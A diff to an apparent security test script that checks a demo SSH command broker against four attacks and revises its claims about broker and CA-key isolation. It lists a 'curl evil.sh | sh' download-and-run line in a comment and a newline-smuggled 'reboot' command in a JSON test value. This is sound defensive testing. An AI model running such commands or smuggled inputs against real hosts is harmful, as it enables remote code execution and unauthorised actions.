@@ -5,7 +5,8 @@
 #
 #   1. curl evil.sh | sh  — shell_parse splits the pipe; `sh` fails the allowlist.
 #   2. newline smuggling  — the signer rejects control characters in the command.
-#   3. dump the broker    — distroless (no shell) and no CA key; nothing to steal.
+#   3. dump the broker    — distroless (no shell); broker.json has no ca_key
+#                           (process isolation). Shared-volume CA is a demo gap.
 #   4. self-approval      — the requester cannot approve its own gated command.
 #
 # It brings up examples/compose (signer + control-plane + broker + sshd), runs
@@ -69,7 +70,7 @@ code=$(ssh_run '{"host":"demo","command":"uptime\nreboot"}')
   || bad "expected 400/403, got $code: $(body)"
 
 echo
-echo "== 3. dump the broker — nothing to exfiltrate =="
+echo "== 3. dump the broker — process isolation (not volume isolation) =="
 if "${COMPOSE[@]}" exec -T broker sh -c 'echo x' >/dev/null 2>&1; then
   bad "the broker container has a shell (expected distroless, none)"
 else
@@ -78,7 +79,7 @@ fi
 if "${COMPOSE[@]}" exec -T sshd grep -q '"ca_key"' /demo/broker.json 2>/dev/null; then
   bad "broker.json contains a ca_key"
 else
-  ok "broker.json has no ca_key — the CA lives only in the signer; the broker's per-op key is ephemeral and discarded"
+  ok "broker.json has no ca_key — the process does not load the CA (signer mints per-op certs); demo volume isolation is intentionally weaker — see CONTAINERS Demo≠production"
 fi
 
 echo
